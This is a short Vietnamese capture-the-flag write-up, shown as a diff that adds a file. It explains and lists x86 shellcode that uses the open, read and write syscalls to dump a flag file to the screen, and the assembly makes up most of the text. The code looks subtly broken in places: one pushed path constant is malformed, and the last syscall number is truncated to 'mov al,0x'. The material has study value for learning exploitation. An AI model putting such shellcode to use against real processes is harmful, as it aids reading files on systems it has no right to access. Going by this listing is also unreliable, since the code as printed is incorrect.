@@ -1,0 +1,27 @@
+Ý tưởng bài này khá đơn giản. đề bài cho chúng ta nhập vào shellcode rồi mov eax, shellcode; call eax; đề bài chỉ cho phép thực thi
+sys_open, sys_read, sys_write và cho chúng ta vị trí của flag. Vậy dễ dàng nghĩ ra ta sẽ viết code để open file đấy ra bằng hàm sys_open,
+sau đó đọc file đó vào 1 vùng nhớ do ta chọn bằng hàm sys_read, cuối cùng in dữ liệu từ vùng nhớ đó ra màn hình
+code: 
+	xor eax,eax
+	xor ecx, ecx
+	xor ebx,ebx
+	push ebx
+	push 0x67616c66   // push chuỗi direction của file vào stack
+	push 0x2f77726f   //..
+	push 0x2f656d6f   //..
+	push 0x682f2ff    //..
+	mov ebx,esp       // đưa chuỗi direction vào thanh ghi ebx
+	mov al,0x05	  // syscall của sys_open là 0x5
+	int 0x80          // gọi interupt
+	//sys_open return về file decriptor
+	mov ebx,eax	  // gửi fd vào cho ebx
+	mov ecx,0x804a160 // gửi địa chỉ vùng nhớ sẽ ghi giá trị vào
+	mov edx,50	  // đọc 50 bytes
+	mov al,0x3	  
+	int 0x80
+	mov ebx, 0x1	  // vì muốn ghi ra màn hình nên truyền tham số là 1(stdout)
+	mov ecx,0x804a160 // gửi lại địa chỉ vùng nhớ đã ghi dữ liệu đã chọn
+	mov edx,50	  // ghi ra màn hình 50 bytes
+	mov al,0x
+	int 0x80
+Done !
